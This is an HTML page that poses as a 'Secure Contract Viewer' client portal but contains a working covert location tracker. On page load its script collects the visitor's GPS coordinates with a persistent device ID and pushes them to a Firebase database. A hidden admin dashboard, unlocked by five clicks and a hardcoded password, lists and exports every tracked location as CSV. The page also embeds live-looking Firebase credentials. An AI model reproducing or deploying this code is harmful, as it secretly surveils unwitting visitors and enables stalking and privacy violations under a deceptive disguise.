<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Contract Viewer</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #f4f4f4;
      color: #333;
    }
    header, footer {
      background: #2b2b2b;
      color: white;
      padding: 20px;
      text-align: center;
    }
    .section {
      padding: 20px;
      border-bottom: 1px solid #ddd;
    }
    .admin-panel {
      display: none;
      background: white;
      padding: 20px;
    }
    #logTable {
      width: 100%;
      border-collapse: collapse;
    }
    #logTable th, #logTable td {
      border: 1px solid #ccc;
      padding: 10px;
    }
    #logTable th {
      background: #eee;
    }
    .hidden-input {
      position: fixed;
      bottom: 10px;
      right: 10px;
      background: #fff;
      padding: 5px;
      border: 1px solid #ccc;
      display: none;
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
</head>
<body>
  <header>
    <h1>Client Project Portal</h1>
  </header>  <div class="section">
    <h2>Client Requirements</h2>
    <p>All specifications must be approved and timestamped.</p>
  </div>
  <div class="section">
    <h2>Terms and Review</h2>
    <p>Final review will be automatically saved and verified upon access.</p>
  </div>
  <div class="section">
    <h2>Legal & Compliance</h2>
    <p>Ensure full adherence to documentation agreements.</p>
  </div>  <div id="adminPanel" class="admin-panel">
    <h2>Admin Dashboard</h2>
    <input type="text" id="search" placeholder="Filter search..." oninput="filterLogs()">
    <button onclick="exportCSV()">Export CSV</button>
    <table id="logTable">
      <thead>
        <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Timestamp</th></tr>
      </thead>
      <tbody id="logBody"></tbody>
    </table>
  </div>  <div class="hidden-input" id="passwordInput">
    <input type="password" id="adminPassword" placeholder="Enter password" onkeydown="checkPassword(event)">
  </div>  <footer>
    <p>This page is protected by a secure contract interface.</p>
  </footer>  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const deviceID = localStorage.getItem("deviceID") || Math.random().toString(36).substring(2);
    localStorage.setItem("deviceID", deviceID);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const log = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          timestamp: new Date().toISOString()
        };
        db.ref("locations/" + deviceID).push(log);
      });
    }

    let tapCount = 0;
    document.body.addEventListener('click', () => {
      tapCount++;
      if (tapCount >= 5) {
        document.getElementById('passwordInput').style.display = 'block';
      }
      setTimeout(() => tapCount = 0, 2000);
    });

    function checkPassword(e) {
      if (e.key === 'Enter' && e.target.value === 'ASCII') {
        document.getElementById('adminPanel').style.display = 'block';
        document.getElementById('passwordInput').style.display = 'none';
        loadLogs();
      }
    }

    function loadLogs() {
      db.ref("locations").on("value", snap => {
        const logs = snap.val();
        const logBody = document.getElementById("logBody");
        logBody.innerHTML = "";
        for (let dev in logs) {
          logs[dev] && Object.values(logs[dev]).forEach(log => {
            const row = `<tr><td>${dev}</td><td>${log.lat}</td><td>${log.lng}</td><td>${log.timestamp}</td></tr>`;
            logBody.innerHTML += row;
          });
        }
      });
    }

    function filterLogs() {
      const query = document.getElementById("search").value.toLowerCase();
      const rows = document.querySelectorAll("#logTable tbody tr");
      rows.forEach(row => {
        row.style.display = row.innerText.toLowerCase().includes(query) ? '' : 'none';
      });
    }

    function exportCSV() {
      let csv = "Device,Latitude,Longitude,Timestamp\n";
      document.querySelectorAll("#logTable tbody tr").forEach(row => {
        csv += Array.from(row.children).map(cell => cell.innerText).join(",") + "\n";
      });
      const blob = new Blob([csv], { type: 'text/csv' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'location_logs.csv';
      a.click();
    }
  </script></body>
              </html>
